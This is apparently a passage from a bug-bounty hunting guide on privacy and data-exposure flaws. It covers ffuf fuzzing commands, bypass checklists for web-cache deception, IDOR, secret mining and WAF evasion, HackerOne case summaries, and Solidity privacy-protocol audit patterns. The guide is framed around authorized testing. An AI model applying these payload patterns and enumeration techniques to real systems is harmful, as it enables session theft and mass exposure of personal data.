  -u 'https://target.com/api/waitlist/us?FUZZ=test' -fs 0 -mc all

ffuf -w seclists/Discovery/Web-Content/common.txt \
  -u 'https://target.com/FUZZ' -mc 200 -fs 0   # find /config, /server-status, *.csv
```

### Detection signals to alert on

```
- Second unauthenticated fetch returns a DIFFERENT user's fields
- Response JSON contains email / jwt / password_hash / SSN / phone
- X-Cache: HIT or Age header on a page that sets a session cookie
- Access-Control-Allow-Origin reflecting an attacker-controlled Origin on a PII route
- A "new" GraphQL/API field not present in the UI
- Cached URL survives after victim logout
```

---

## Common Root Causes

1. **Missing object-level authorization (IDOR).** The endpoint checks "is the user logged
   in?" but not "does this record belong to them?" — the dominant cause across DoD and
   affiliates (#2524562, #1323406, #1626508, #2586584, #2967032, #1690044).

2. **Predictable / sequential identifiers.** Numeric `user-id`, sequential Salesforce IDs,
   `saarnId`, `checkout_ari`, and `Download.aspx?id=` make neighbor enumeration trivial
   (#2294930, #2967032, #1556950).

3. **Private pages cacheable by shared proxies.** Path confusion plus a static extension
   causes a reverse proxy/CDN to store an authenticated response and serve it to others;
   session and CSRF tokens land in the cache (#1698316, #1271944).

4. **Secrets in client-reachable artifacts.** API keys in JS bundles, APKs, public GitHub
   repos (current code AND old commits), disclosed reports, and cleartext log statements
   (#983331, #1641475, #674774, #1094151, #3017105, #1662194).

5. **Over-permissive roles / broken privilege boundaries.** Moderator shared-access users
   and self-registered accounts can call privileged APIs returning parent emails/JWTs or full
   user lists (#1072893, #1624374, #787955).

6. **Misconfigured storage & record permissions.** Public Google Drive links, open S3
   buckets, Salesforce object permissions, and exposed presentation slides with live or
   masked PII (#2926447, #1448218, #2294930, #719631).

7. **No rate limiting / brute-force protection.** Password-reset flows enumerate SSANs and
   PII; `throttle()` is never called (#2748003, #1596918).

8. **Privacy-setting regressions.** Email verification unsets "Protect your Tweets"; third-
   party APIs bypass privacy settings; a privacy flag fails to hide accounts (#472013,
   #273698, #708696).

9. **Sensitive actions/data over GET.** Tokens in URLs get cached, logged, and left in
   browser history; unlink-account via GET enables CSRF (#163820).

10. **Cleartext storage & backup artifacts.** DB credentials in `.orig`, password hashes in
    admin `api/users`, and cleartext password returned in JSON and lingering in RAM
    (#1626236, #1489892, #215083).

11. **Exposed debug/monitoring surfaces.** `/server-status/`, Grafana metrics, the Splunk raw
    endpoint, `/config`, `.git/config`, and AEM CRXDE Lite (#1632104, #1448218, #1860905,
    #1018413, #3612891, #1095830).

12. **Trust in partner/third-party APIs.** A privacy control enforced on the primary app is
    absent on the partner API (#273698, #1072893, #329957).

---

## Bypass Techniques

### Cache-deception variants

```
- Append static extensions: .css .js .jpeg .png .ico .txt
- Path confusion: /profile/edit/x.css, /profile.css/edit, /;/x.css
- Cache-buster query: ?cb=<random>, ?triagethis
- Double encoding: /..%2fx.css, %2e%2e/
- Semicolon/matrix params: /profile;x.css, /a;/b.css
```

If one extension is normalized away, try others; the cache key and the origin's route
resolution often disagree.

### IDOR / object-reference variants

```
- Numeric walking, negative IDs, ID 0, very large IDs
- Swap ref types: checkout_ari, saarnId, VendorId, user-id, @username
- UUID to numeric equivalents; sequential 18-digit Salesforce IDs
- Replay another user's POST body with your session cookie
- Change only the object ID, keep your auth token (tests authz, not authn)
- Encode ID in base64/URL-encoded form if a filter only sees raw input
```

### Secret-discovery variants

```
- Search OLD commits and PR "files changed" diffs, not just HEAD (#1094151)
- Mine DISCLOSED reports for un-redacted keys (#1047125)
- Search by subdomain, not just company name (#1298809)
- Decode base64 / check source maps / webpack chunks
- Inspect APK/exe binaries for App ID + secret pairs (#1641475)
- grep "Authorization" logging statements (#1662194)
```

### Backup / config variants

```
- .orig .bak .old .save ~ , .git/config, .svn/, /config, .env
- view-source: to read raw PHP/config that the server executes normally
- Google-cached/Wayback versions of removed PII pages (#1860905)
```

### Privacy-boundary variants

```
- Register a fresh low-privilege account and test every admin/other-user route
- Use a partner/SSO app to read data the primary app hides (#273698)
- Re-verify privacy flags after profile/email changes (#472013)
- Cross-origin read via permissive CORS on a PII endpoint
- Blind XSS to an admin panel to read data you cannot access directly (#878145)
```

### Filter/WAF evasion for data endpoints

```
- Case-vary file extensions and parameter names
- URL-encode (once and twice) object IDs and secret paths
- Add trailing dot / IDN to bypass privacy-policy matching (#1753226, #1565622)
- Try alternative API versions (/v1, /v2, /wp/v2) that omit authz checks
```

---

## Gate 0 Validation

Before writing the report, confirm ALL of the following. A privacy finding that fails any
gate is likely to be closed as "not sensitive," "test data," or "expected behavior."

1. **Whose data is it, really?**
   - Show that the response contains data belonging to a DIFFERENT user — another user's
     email, address, SSN, token, or PII — not your own.
   - Use two accounts and show A reading B's record, or an unauthenticated request returning
     a real user's data.
   - "The endpoint returned my own profile" is NOT a finding.

2. **Is the data actually sensitive / unauthorized?**
   - Name the exact fields: SSN, CAC ID, DODID, clearance, PHI, phone, address, JWT, password
     hash, or CSRF token.
   - Explain why the recipient should not have access — no authz, wrong role, public cache,
     or partner scope.
   - If it is only a username already visible in the UI, severity is low — say so.

3. **Is it real data and at what scale?**
   - Confirm it is not test/dummy data (google an email to find a LinkedIn profile,
     cross-check a record) — #374007 did this.
   - Quantify: how many records/users are exposed? Sequential IDs, "2000 per request"
     (#2294930), "tens of thousands" (#2967032), "1000 endpoints" (#1172852).
   - Scale plus sensitivity plus lack-of-authz is the severity formula.

4. **Is it reliably reproducible in 10 minutes from scratch?**
   - Are the endpoint and parameter still live?
   - Can a second person with a fresh account follow your steps and get another user's data?
   - Does the cache-poison reproduce (not a one-off cache hit)?
   - If secret-based: is the key still valid (test it), and is the repo/bundle still public?

5. **Is it in scope / good faith?**
   - Some reports were on out-of-scope assets but accepted as misconfigurations (#3612891,
     #1448218). Check the program policy and state your reasoning.
   - For secrets, confirm the provider accepts the report (AWS VDP, GitHub, app vendors).

**Do not submit** if the only proof is "the JS bundle is large" (#983331's DoS side-note was
not the finding) — the finding was the leaked key, not the bundle size.

---

## Real Impact Examples

### Scenario A: Web-cache deception → session-token theft → account takeover (Expedia/Abritel + Shopify pattern)

A caching reverse proxy sits in front of an authenticated travel site. The attacker lures a
victim into opening
`https://.../search/keywords:soissons-france/minNightlyPrice/x.jpeg?triagethis` while logged
in. The origin treats the path as the private search/profile page and returns the victim's
HTML, but the proxy treats `.jpeg` as a static, cacheable object and stores the response.
The attacker fetches the same URL unauthenticated and extracts `HASESSIONV3` and the
`ha.crumb` token from `/traveler/profile/edit`, then replays the session to assume the
victim's identity (#1698316, High, 2022). Shopify's variant used path confusion plus a random
`.css` filename to cache personal information and CSRF tokens (#1271944, 2021, $800). Impact:
full session hijack and CSRF-token theft from a single victim click.

### Scenario B: Sequential-IDOR → mass PII + CUI exposure (DoD Salesforce/HR pattern)

An authenticated portal exposes self-service records keyed by sequential identifiers. A
researcher registers two accounts (user-id 1328 and 1327), captures a
`/JOINOnline/Board/QuestionCard/<user-id>/...` or
`/SelfService/Home/dynamicdata/section/.../124948002` request, walks the numeric ID in
Intruder, and greps for `Primary MOS` (#1556950). In the most severe case, changing `saarnId`
exposed Address, Full Name, Email, Phone, DoB, Supervisor, DODID Number, Controlled
Unclassified Information, and Clearance Level for "tens of thousands of users and
supervisors" (#2967032, High, 2025). Related: a single `Download.aspx?id=` increment exposed
bank taxes, contracts, and soldiers' PII (#1626508); misconfigured Salesforce object
permissions exposed hundreds of thousands of tour visitors' names, emails, and phones
(#2294930, Critical, 2023). Impact: large-scale PII/CUI breach with identity-theft and
phishing consequences.

### Scenario C: A live secret in a public artifact → third-party account/API compromise (Stripo/AWS/GlassWire pattern)

A researcher parses a production JS bundle and finds `aviaryApiKey` and `youtubeApiKey`
hardcoded (#983331). Later, another researcher reads the *disclosed report* of that finding,
notices the keys were never blurred, and confirms they still work against YouTube's API — a
second live finding from the first (#1047125). The same pattern recurs with AWS keys in a
public repo (#3017105), a Facebook App secret in an APK that mints a working access token via
`graph.facebook.com/oauth/access_token` (#1641475), and a Rockset key visible only in an old
commit that authenticates against `api.rs2.usw2.rockset.com` (#1094151). Impact:
unauthorized API usage, data access, billing charges, and modification of third-party app
settings — each confirmed by calling the provider's own API, not by assuming the key works.

---

## Disclosed Report Citations (30 — all IDs verified present in the study pack)

1. **Expedia Group Bug Bounty — Cache Deception Allows Account Takeover** ([H1 #1698316](https://hackerone.com/reports/1698316)) — web-cache deception to session/CSRF token theft to ATO; path-confusion cache poisoning with `x.jpeg`, 2022.
2. **Shopify — Shopify.com Web Cache Deception vulnerability leads to personal information and CSRF tokens leakage** ([H1 #1271944](https://hackerone.com/reports/1271944)) — web-cache deception via path confusion plus `.css`; PII/CSRF leak, 2021 — $800.
3. **Stripo Inc — Public and secret api key leaked in JavaScript source** ([H1 #983331](https://hackerone.com/reports/983331)) — secrets in JS bundle; `aviaryApiKey`/`youtubeApiKey` hardcoded in `main.<hash>.js`, 2020.
4. **AWS VDP — Sensitive API Key Leakage** ([H1 #3017105](https://hackerone.com/reports/3017105)) — public-code-search; AWS access and secret key in a public GitHub repo, 2025.
5. **X / xAI — AppLovin API Key hardcoded in a Github repo** ([H1 #674774](https://hackerone.com/reports/674774)) — public-code-search; AppLovin SDK/UI key hardcoded in `AndroidManifest.xml`, 2019 — $280.
6. **Rockset — Leaking Rockset API key on Github** ([H1 #1094151](https://hackerone.com/reports/1094151)) — public-code-search; key in an OLD commit, verified live against `api.rs2.usw2.rockset.com`, 2021.
7. **GlassWire — Facebook App API credentials leaked in the APK** ([H1 #1641475](https://hackerone.com/reports/1641475)) — binary secret extraction; App ID plus secret in `GlassWire.exe`, token minted via Graph API, 2022.
8. **Omise — Secret API Key is logged in cleartext** ([H1 #1662194](https://hackerone.com/reports/1662194)) — debug logging of `Authorization: <api_key>` in `omise-python`, 2022.
9. **Zenly — Insecure Storage and Overly Permissive API Keys in Android App** ([H1 #753868](https://hackerone.com/reports/753868)) — APK decompilation; hardcoded keys/tokens, 2019 — $750.
10. **Stripo Inc — Non-revoked API Key Disclosure in a Disclosed API Key Disclosure Report on Stripo** ([H1 #1047125](https://hackerone.com/reports/1047125)) — secrets in disclosed reports; unblurred keys from #983331 still valid, 2020.
11. **WakaTime — IDOR to view order information of users and personal information** ([H1 #2524562](https://hackerone.com/reports/2524562)) — IDOR on `/api/v1/users/@username`, 2024.
12. **Affirm — IDOR to view order information of users and personal information** ([H1 #1323406](https://hackerone.com/reports/1323406)) — IDOR via `checkout_ari` swap to full address/payment PII, 2021 — $500.
13. **U.S. Dept Of Defense — IDOR leading unauthenticated attacker to download documents discloses PII of users and soldiers** ([H1 #1626508](https://hackerone.com/reports/1626508)) — unauth IDOR on `Download.aspx?id=`, 2022 — $500.
14. **U.S. Dept Of Defense — IDOR leads to PII Leak** ([H1 #2586584](https://hackerone.com/reports/2586584)) — numeric `user-id` walk on `UpdateProfile`, 2024.
15. **U.S. Dept Of Defense — IDOR leads to view other user Biographical details (Possible PII LEAK)** ([H1 #2586641](https://hackerone.com/reports/2586641)) — multi-endpoint IDOR on `QuestionCard/<user-id>/...`, 2024.
16. **U.S. Dept Of Defense — IDOR leads to disclosure of PHI/PII** ([H1 #1085782](https://hackerone.com/reports/1085782)) — IDOR on sponsor shot-record PDFs, 2021.
17. **U.S. Dept Of Defense — IDOR Exposes PII of Tens of Thousands of Users and Supervisors** ([H1 #2967032](https://hackerone.com/reports/2967032)) — IDOR via `saarnId`; name/address/DoB/DODID/clearance at scale, 2025.
18. **U.S. Dept Of Defense — IDOR leaking PII data via VendorId parameter** ([H1 #1690044](https://hackerone.com/reports/1690044)) — IDOR on `VendorId` / contacts save, 2022.
19. **Shopify — User sensitive information disclosure** ([H1 #975047](https://hackerone.com/reports/975047)) — IDOR via `/api/sp/customer/id` traversal, 2020 — $1,000.
20. **HackerOne — TeamProfile exposes partially sensitive information through GraphQL** ([H1 #389600](https://hackerone.com/reports/389600)) — GraphQL hidden field `team_profile`, 2018.
21. **Lab45 — PII of Users Disclosure using "/members/invite/" endpoint** ([H1 #787955](https://hackerone.com/reports/787955)) — invite-endpoint IDOR/query manipulation to user emails, 2020.
22. **Eternal — [Zomato Order] Insecure deeplink leads to sensitive information disclosure** ([H1 #532225](https://hackerone.com/reports/532225)) — `exported="true"` deeplink router WebView, 2019 — $750.
23. **X / xAI — Changing email address on Twitter for Android unsets "Protect your Tweets"** ([H1 #472013](https://hackerone.com/reports/472013)) — privacy-setting regression on email verification, 2018 — $2,940.
24. **X / xAI — Unauthorized Access to Protected Tweets via niche.co API** ([H1 #273698](https://hackerone.com/reports/273698)) — third-party/partner API bypass of protected-tweet privacy, 2017.
25. **U.S. Dept Of Defense — Lack of rate limiting in PassReset.aspx leads to PII disclosure and potential account takeover** ([H1 #2748003](https://hackerone.com/reports/2748003)) — no rate limit to SSAN brute force via password reset, 2024.
26. **U.S. Dept Of Defense — Public google drive link Exposes Military Orders Containing PII (Name, SSN etc..) and Operational Details** ([H1 #2926447](https://hackerone.com/reports/2926447)) — misconfigured public storage link; SSN/address/clearance, 2025.
27. **U.S. Dept Of Defense — leaking PII of tour visitors (names, email addresses, phone numbers) via misconfigured record permissions** ([H1 #2294930](https://hackerone.com/reports/2294930)) — Salesforce object permission misconfig at scale, 2023.
28. **JetBlue — Sensitive information disclosure on grafana** ([H1 #1448218](https://hackerone.com/reports/1448218)) — `/metrics`, `/sap/public/info`, open bucket; internal IP/OS leak, 2022.
29. **U.S. Dept Of Defense — Sensitive information disclosure [HtUS]** ([H1 #1632104](https://hackerone.com/reports/1632104)) — exposed `/server-status/` directory, 2022 — $500.
30. **Logitech — Sensitive information disclosure to shared access user via streamlabs platform api** ([H1 #1072893](https://hackerone.com/reports/1072893)) — broken privilege boundary; parent email/JWT via `/api/v1/s/user/me`, 2021 — $200.

---

## Related Skills & Chains

- **`hunt-source-leak`** — the natural entry point. Source maps, `.git`, Swagger, and JS
  bundles from that skill are exactly where the secrets/endpoints in this skill come from
  (#983331, #3612891, #1094151). Chain: source-leak to parse bundle/repo to live-key
  verification to privacy report.

- **`hunt-ssrf`** — SSRF that reaches internal APIs/metadata often returns sensitive internal
  data (#310036 leaked an internal IP). Chain: SSRF to internal admin/PII endpoint to privacy
  violation; use its OOB gate to prove the request actually left the server.

- **`hunt-idor` / `hunt-bac`** — IDOR is the single largest subclass here. Chain: swap object
  ref to confirm another user's data to enumerate scale to quantify PII classes.

- **`hunt-web-cache-deception`** — the cache-poisoning primitive behind the highest-value
  token-theft cases (#1698316, #1271944). Chain: path confusion to cache a private page to
  unauth fetch to session/CSRF token to ATO.

- **`hunt-api` / `hunt-graphql`** — the enum/hidden-field techniques behind #1489892,
  #389600, #2450685. Chain: discover hidden field/route to query for fields absent in the UI
  to PII exposure.

- **`hunt-csrf`** — stolen CSRF tokens from cache/XSS (#1271944) and sensitive GET actions
  (#163820) feed straight into state-changing attacks. Chain: privacy leak to token to CSRF
  to ATO.

- **`hunt-mobile`** — APK decompilation and exported activities (#532225, #753868,
  #1641475). Chain: decompile to extract secret/deeplink to verify against provider API.

- **`hunt-recon` / `dorking`** — Google dorking and Wayback (#374007, #644358, #1514356,
  #1860905) surface the documents and cached pages that drive public-storage findings.

- **`cloud-iam-deep`** — when the leaked secret is an AWS access key (#3017105) or a cloud
  metadata token, chain into privilege escalation and resource access.

- **`triage-validation`** — apply the Gate 0 above: prove the data belongs to another user,
  is genuinely sensitive, is real (not test data), and is reproducible before submitting.


---

## Merged Source Knowledge

This section consolidates **14 unique knowledge blocks** from 1 curated source skills in `hunt-skills/`, `normal-skills/`, and `offensive-skills/`. Blocks overlapping the report-mined sections above were dropped; the complete, globally deduplicated source corpus is archived at `references/source-knowledge.md` (14 unique sections). No source section appears in more than one hunt skill.


### From `hunt-skills/bountyforge/skills/smart-contract-audit/reference/solidity/protocols/privacy.md`

# Privacy Protocol Security Patterns

> Applies to: privacy protocols, on-chain mixing, zero-knowledge proof systems, shielded pools, Tornado Cash-style, Aztec-style, zk-privacy applications

## Protocol Context

Privacy protocols maintain shielded state-balances, notes, commitments-that must remain consistent with the underlying token balances they represent. The key security invariant is that the public contract state never leaks information about individual users while still enforcing economic correctness: every withdrawal must correspond to a valid prior deposit, and the aggregate shielded balance must equal the aggregate deposited tokens. This dual requirement-cryptographic correctness and economic soundness-means that standard DeFi vulnerabilities (reentrancy, oracle manipulation, rounding) interact with privacy-specific concerns (proof malleability, nullifier handling, commitment ordering) in ways that are often more severe than in transparent protocols.

---

### Fee-on-Transfer Token Mishandling (ref: fv-sol-5)

**Protocol-Specific Preconditions**
- Privacy protocol supports arbitrary ERC-20 deposits and claims support for "any token pair"
- Internal shielded balance is credited the full nominal deposit amount, but the vault's actual token balance is less due to transfer fees
- Callback-based token intake patterns verify that exactly the expected amount arrived and revert for any shortfall, making fee-bearing tokens permanently unusable even if they are otherwise valid assets

**Detection Heuristics**
- Identify all `safeTransferFrom(sender, address(this), amount)` calls where `amount` is used directly to update internal shielded balances
- Look for `require(token.balanceOf(address(this)) >= balanceBefore + amount)` patterns that enforce exact amounts; these hard-revert for fee-on-transfer tokens
- Check privacy protocol whitepapers for claims of "any ERC-20 support" without a corresponding fee-on-transfer exclusion
- Find `_increaseInternalBalance(recipient, token, amount)` called immediately after `safeTransferFrom` without a balance diff measurement

**False Positives**
- Protocol maintains an explicit whitelist of supported tokens that excludes all fee-bearing assets
- Protocol clearly documents that fee-on-transfer tokens are unsupported and input validation enforces this
- The protocol only interacts with USDC, WETH, DAI, or other tokens with no transfer fee

**Notable Historical Findings**
Beanstalk's internal balance system (used by its privacy and composability features) credited users the full nominal amount on `LibTransfer` operations, but the actual token balance fell short by the accumulated fee on every transfer, creating a growing insolvency gap across the affected token pools. Timeswap's mint and convenience contracts reverted with "Insufficient token transfer" for any fee-on-transfer token because the callback verification enforced exact amounts, making those tokens permanently unusable in the protocol despite no explicit exclusion.

**Remediation Notes**
- Measure actual received amount as `token.balanceOf(address(this)) - balanceBefore` and use that value for all internal balance credits
- For callback-based systems, pass `actualReceived` to the verification step rather than the original `amount` parameter
- Alternatively, enforce the token whitelist at the smart contract level with an on-chain allowlist rather than relying on documentation

---

### Flash Loan Price Manipulation (ref: fv-sol-10)

**Protocol-Specific Preconditions**
- Privacy protocol uses spot Curve pool balance ratios to detect collateral depeg rather than oracle-reported prices
- NFT-gated access to private participation rounds checks `nft.balanceOf(msg.sender)` at the time of the call rather than at a prior snapshot
- Liquidity valuation for collateral uses a spot AMM swap output (`getAmountOut`) rather than a TWAP or oracle-reported price

**Detection Heuristics**
- Identify collateral or depeg checks that compute a ratio from `curvePool.balances(i) / totalBalance` within the same transaction that could have those balances manipulated
- Search for `require(nft.balanceOf(msg.sender) > 0)` gates in time-sensitive participation functions
- Check if `router.getAmountOut` is used for any valuation that feeds into collateral, liquidation, or reward calculations
- Look for melt or burn-rate functions where the economic outcome depends on current token supply ratios

**False Positives**
- Protocol uses TWAP pricing exclusively for all collateral and depeg checks
- Protocol uses Chainlink feeds that cannot be influenced by within-block actions
- NFT balance gate uses a historical snapshot (`balanceOfAt(user, snapshotBlock)`) rather than current balance
- Flash-loan protection (same-block transfer restrictions) is in place

**Notable Historical Findings**
Reserve Protocol's `_anyDepeggedInPool` function measured Curve pool balance ratios at spot to determine if an asset had depegged; a flash loan could skew those balances beyond the deviation threshold, triggering a false depeg detection and locking collateral operations. Boot Finance's privacy-adjacent participation round used a live `nft.balanceOf` check that could be satisfied by flash-borrowing an eligible NFT for the duration of the transaction, bypassing the intended access restriction entirely. Reserve's `Furnace.melt` was vulnerable to sandwich attacks because the melt rate was computed from a spot price that could be moved by a large preceding swap.

**Remediation Notes**
- Replace spot balance ratio checks with Chainlink oracle comparisons per token to a peg price
- Replace live `balanceOf` gates with `balanceOfAt(user, snapshotBlock)` checks using a block snapshot captured before the participation window opens
- Use a TWAP from the specific pool (`oracle.consult(token1, amount, USDC, TWAP_PERIOD)`) rather than spot swap output for any liquidity valuation

---

### Front-Running Initialization and Setup Functions (ref: fv-sol-4)

**Protocol-Specific Preconditions**
- Proxy-based privacy protocol deploys an implementation and calls `initialize()` in a separate transaction, leaving a window for an attacker to front-run the initialization and claim ownership
- Pool or note-commitment initialization accepts a first-caller that can set the initial price ratio or interest rate with negligible capital, distorting all subsequent operations
- Approval-based group-buy contracts interact with USDT-style tokens that revert on non-zero to non-zero approval changes, permanently blocking all group operations after the first instance completes

**Detection Heuristics**
- Search for `initialize()` functions that are `public` or `external` without `initializer`, `onlyOwner`, or factory-enforced access control
- Identify proxy contracts where the implementation's `initialize()` is callable directly on the implementation address
- Look for first-minter or first-depositor paths that set critical pool parameters without minimum deposit requirements or locked minimum liquidity
- Check USDT (and similar token) approval sequences in group or shared contracts for the approve-without-zero-reset vulnerability that blocks second use

**False Positives**
- Initialization is called atomically within a factory `create` function in the same transaction as deployment
- `initializer` modifier from OpenZeppelin is applied and the implementation is also initialized in its constructor
- The front-running window exists but has no exploitable consequence because parameters are fixed by governance regardless of caller

**Notable Historical Findings**
Unlock Protocol's `PublicLock.initialize()` was `public` with no access control and no deployer check, allowing an attacker to front-run any deployment and claim the lock's creator role-effectively taking over the economic parameters of the newly deployed lock. Timeswap's pool initialization was front-runnable: an attacker could observe a pending `mint` transaction and insert their own `mint` with extreme asset/collateral ratios at minimal cost, permanently distorting the initial interest rate for the affected pool. Reserve Protocol suffered from multiple initialization-adjacent vulnerabilities where early users could manipulate the stakeRate and basketsNeeded/supply ratio by calling `issue` followed by `melt` before other participants entered.

**Remediation Notes**
- Call `_disableInitializers()` in every upgradeable implementation's constructor and deploy through a factory that initializes atomically
- Enforce a minimum initial deposit and burn `MINIMUM_LIQUIDITY` shares to `address(0)` on first mint
- For group contracts using USDT, reset approvals to zero and then re-approve at the start of each new group operation

---

### Incorrect Collateral Valuation (ref: fv-sol-10)

**Protocol-Specific Preconditions**
- Collateral value computation omits external protocol exchange fees (Synthetix exchange fee, Lyra withdrawal fee) that would reduce the actual liquidation proceeds
- Withdrawal fee from an external LP is applied unconditionally in the valuation, but the external protocol only charges the fee under certain conditions (e.g., only when live option boards exist)
- Stablecoin collateral is valued at a hardcoded 1:1 peg without consulting an oracle, leaving the protocol exposed to depeg events
- Debt calculation uses principal-only balance (`isoUSDLoaned`) instead of the principal-plus-accrued-interest balance, allowing users to borrow against interest they already owe

**Detection Heuristics**
- Compare the collateral valuation function against the actual liquidation path on the underlying protocol; any fee or cost incurred in liquidation must be reflected in the valuation
- Search for conditional fee application logic and verify it matches the external protocol's actual fee schedule precisely
- Identify hardcoded `USDC = $1` or equivalent peg assumptions; require oracle validation for all stablecoins
- Check all debt read sites: does the code read `loanPrincipal` or `loanPrincipalPlusInterest`?

**False Positives**
- Fee discrepancy falls within the over-collateralization buffer, making the valuation error economically harmless
- Protocol intentionally undervalues collateral as a conservative safety measure
- External fee structure is fixed and immutable, making the valuation approximation reliably accurate

**Notable Historical Findings**
Isomorph's `Vault_Synths` priced Synthetix synthetic collateral at face value without deducting the Synthetix exchange fee that would be charged on liquidation, causing the protocol to believe collateral was worth more than its actual liquidation value and enabling under-collateralized positions. The Lyra vault variant incorrectly applied the withdrawal fee unconditionally, but Lyra only charges the fee when there are active option boards; this caused Lyra collateral to be systematically undervalued during quiet periods, blocking healthy users from accessing their full collateral value. A separate Isomorph finding showed that `isoUSDLoaned` (principal only) was used instead of `isoUSDLoanAndInterest` for total debt calculation, allowing borrowers to take out new loans against the outstanding interest they already owed.

**Remediation Notes**
- For each external protocol used as collateral, explicitly model every fee charged during liquidation and deduct it from the valuation
- Make fee application conditional on the same runtime conditions the external protocol uses (e.g., `optionMarket.getNumLiveBoards() != 0` for Lyra fees)
- Always use an oracle price for stablecoin collateral; never assume a 1:1 peg at the smart contract level

---

### Missing Access Control on Sensitive Functions (ref: fv-sol-4)

**Protocol-Specific Preconditions**
- Withdrawal function transfers tokens to `msg.sender` but only requires approval over a deposit NFT, not that `msg.sender` is the NFT owner
- Vesting function accepts any beneficiary address from any caller, enabling griefing attacks that fill the beneficiary's timelock array with dust entries and cause out-of-gas on legitimate claims
- Initialization function is `external` without access control and can be front-run between deployment and initialization

**Detection Heuristics**
- Identify external functions that transfer tokens to `msg.sender`; verify `msg.sender` is the NFT owner or rightful beneficiary, not merely someone who triggers the function
- Look for `timelocks[_beneficiary].push(...)` or equivalent unbounded array appends where `_beneficiary` is caller-supplied
- Search for `initialize()` without `initializer`, `onlyOwner`, or factory-based access control
- Trace all `burn()` call paths: does the burning contract verify both that the caller is approved AND is the intended depositor?

**False Positives**
- Function is intentionally permissionless (e.g., public liquidation that anyone should be able to trigger)
- Operation is harmless regardless of caller (e.g., anyone can trigger a public price update)
- Function only operates on `msg.sender`'s own data, making caller identity implicit

**Notable Historical Findings**
Isomorph's `withdrawFromGauge` burned the deposit NFT and sent the underlying AMM tokens to `msg.sender` without verifying that `msg.sender` owned the NFT; any approved operator could trigger the withdrawal and redirect the tokens to themselves rather than the legitimate depositor. Boot Finance's vesting function accepted any caller-supplied beneficiary address with no minimum amount, allowing an attacker to fill a victim's timelock array with thousands of dust entries until the legitimate claim function exceeded the block gas limit. Reserve Protocol's redemption function during undercollateralization could be hot-swapped by a searcher who front-ran the redemption transaction to substitute their own token for a more valuable basket asset.

**Remediation Notes**
- Add `require(depositReceipt.ownerOf(_NFTId) == msg.sender)` to all withdrawal functions before executing any transfer
- Restrict vesting to `msg.sender` as the beneficiary and enforce a minimum vest amount to prevent array-stuffing griefing
- Use `initializer` modifier or deploy-and-initialize atomically in a factory to close the initialization front-running window

---

### Missing Event Emissions After Sensitive Actions (no fv-sol equivalent - candidate for new entry)

**Protocol-Specific Preconditions**
- Administrative parameter changes (fee rates, scanner registration, whitelist modifications) execute silently without emitting events
- Off-chain monitoring systems and indexers rely on events to detect protocol state changes; missing events mean unauthorized changes may go undetected
- Fund distribution operations do not emit per-recipient events, making it impossible to audit payout history without replaying the full transaction calldata

**Detection Heuristics**
- Enumerate all external and public functions with `onlyOwner`, `onlyAdmin`, or similar modifiers; verify each emits an appropriate indexed event
- Focus on parameter change functions: fee rates, oracle addresses, access control roles, pause state
- Check upgrade and initialization functions for event emissions
- Verify that token transfers emit standard ERC-20/721 Transfer events from downstream calls, not just internal state changes

**False Positives**
- Function is a pure computation with no state changes
- Event is emitted by a downstream OpenZeppelin function (e.g., `_transfer` already emits `Transfer`)
- State change is trivially visible on-chain without event indexing (e.g., a storage slot update to a public variable)

**Notable Historical Findings**
Forta Protocol's scanner registration and configuration functions executed without event emissions, making it impossible for off-chain monitoring systems to detect unauthorized registrations or configuration changes without polling every storage slot. Notional's governance contracts updated critical parameters (voting thresholds, proposal weights) without events, creating a situation where governance attacks could modify protocol behavior with no observable on-chain trace beyond the raw transaction. Futureswap's admin functions similarly changed operational parameters without events, undermining the transparency guarantees that DeFi protocols rely on for user trust.

**Remediation Notes**
- Emit an indexed event for every admin-controlled parameter change, including the old and new values
- Define events for all role assignments and revocations with the granting address, receiving address, and role identifier
- For fund distributions, emit per-recipient events that allow reconstruction of the full payout history from event logs alone

---

### Missing Two-Step Ownership Transfer (ref: fv-sol-4)

**Protocol-Specific Preconditions**
- Privacy protocol uses `transferOwnership(newOwner)` that immediately replaces the owner with no confirmation step
- A typo in the new owner address or transfer to an uncontrolled contract permanently removes admin capability
- Diamond proxy patterns use a single-step `setContractOwner` without a pending/accept workflow

**Detection Heuristics**
- Search for `transferOwnership` functions that immediately assign the new owner without a `pendingOwner` pattern
- Confirm the contract inherits from `Ownable2Step` rather than `Ownable` for two-step transfer semantics
- Check for `renounceOwnership()` accessibility; this function permanently removes admin control
- Verify that all critical protocol contracts (treasury, governance, vault admin) use two-step transfer

**False Positives**
- Ownership is managed by a multisig that inherently provides confirmation before execution
- Contract is immutable and ownership is non-transferable by design
- Timelock provides a delay window sufficient for detecting and cancelling erroneous transfers

**Notable Historical Findings**
Beanstalk's diamond proxy used a single-step `transferOwnership` for the contract owner role, which controls the ability to add and remove diamond facets; a single erroneous transaction could have permanently locked the entire protocol's upgradeability. Boot Finance had no ownership transfer pattern at all-the owner address was immutable and the protocol had no path for governance succession. Reserve Protocol discovered that a `transferOwnership` flow without confirmation could leave the `StRSR` contract permanently unusable if ownership was transferred to a contract that could not call `acceptOwnership`.

**Remediation Notes**
- Use OpenZeppelin's `Ownable2Step` instead of `Ownable` for all protocol contracts with meaningful admin functions
- Override `renounceOwnership` to `revert` on contracts where admin functions must remain callable
- For diamond proxies, implement a `proposeOwner` / `acceptOwner` pattern at the `LibDiamond` level

---

### Operations Blocked During Pause or Freeze (ref: fv-sol-9)

**Protocol-Specific Preconditions**
- `whenNotPaused` or `_checkIfCollateralIsActive` is applied equally to loan closure, collateral addition, and liquidation-blocking protective actions the same way it blocks new borrowing
- Interest or fee accrual continues during the paused period, penalizing users who cannot interact to protect their positions
- A single collateral's oracle going stale blocks all operations across the entire protocol, including full-repayment paths that do not require price information

**Detection Heuristics**
- Identify functions that should remain available during a pause (close loan, repay debt, add collateral) and verify they are not gated by the same pause modifier as new-loan functions
- Check if interest accrual (virtual price updates) continues when the protocol is paused; if so, positions degrade silently during the freeze
- Verify that full-repayment paths skip the collateral valuation check when the repayment amount covers all debt
- Look for parameter changes (fee rates, collateral factors) that can be applied during a pause without user ability to respond

**False Positives**
- Pause duration is extremely short by design and interest accrual during that window is negligible
- Emergency withdrawal function remains active during pause and provides an exit path
- Interest accrual is explicitly frozen during the pause period

**Notable Historical Findings**
